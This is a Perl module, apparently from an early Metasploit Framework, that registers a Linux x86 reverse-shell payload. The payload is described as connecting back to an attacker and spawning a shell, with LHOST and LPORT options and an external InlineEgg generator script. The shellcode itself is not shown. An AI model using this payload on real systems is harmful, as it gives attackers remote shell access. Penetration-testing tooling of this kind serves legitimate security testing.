package Msf::Payload::linx86_reverse_ie;
use strict;
use base 'Msf::ExternalPayload';

my $info =
{
    'Name'         => 'linx86reverse_ie',
    'Version'      => '1.0',
    'Description'  => 'Connect back to attacker and spawn a shell',
    'Author'       => 'gera[at]corest.com [InlineEgg License]',
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'linux' ],
    'Multistage'   => 0,
    'Type'         => 'reverse_shell',
    'Size'         => 0,
    'UserOpts'     =>
        {
            'LHOST' => [1, 'ADDR', 'Local address to receive connection'],
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_ie.py';
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate({LHOST => '127.0.0.1', 'LPORT' => '4444',});
    return length($bin);
}
